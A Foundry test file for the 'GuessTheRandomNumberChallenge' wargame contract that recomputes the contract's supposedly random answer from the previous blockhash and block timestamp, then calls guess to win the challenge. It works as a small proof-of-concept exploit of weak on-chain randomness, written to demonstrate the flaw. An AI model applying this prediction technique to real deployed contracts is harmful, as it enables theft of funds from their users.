
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public challenge;

    function setUp() public {
        vm.deal(address(this), 100 ether);
    }

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockTimestamp >= block.timestamp);
        vm.assume(blockNumber >= block.number);
        vm.assume(blockNumber >= 1);
        
        // --- 2. State Configuration ---
        
        // Funding (if needed)
        
        // MANIPULATE BLOCK ENVIRONMENT
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);

        // Deploy the contract after setting block state
        challenge = new GuessTheRandomNumberChallenge{value: 1 ether}();

        // --- 3. Replication & Assertion ---
        
        // PREDICT THE OUTCOME
        // Replicate the vulnerable logic locally inside the test.
        bytes32 prevHash = blockhash(blockNumber - 1);
        uint8 expectedAnswer = uint8(uint256(keccak256(abi.encodePacked(prevHash, blockTimestamp))));
        
        // EXECUTE
        // Call the contract method.
        challenge.guess{value: 1 ether}(expectedAnswer);

        // ASSERT PREDICTABILITY
        // Prove that the contract's "random" value matches our calculated expectation by completing the challenge.
        assertTrue(challenge.isComplete(), "Randomness should be predictable given block state");
    }
}
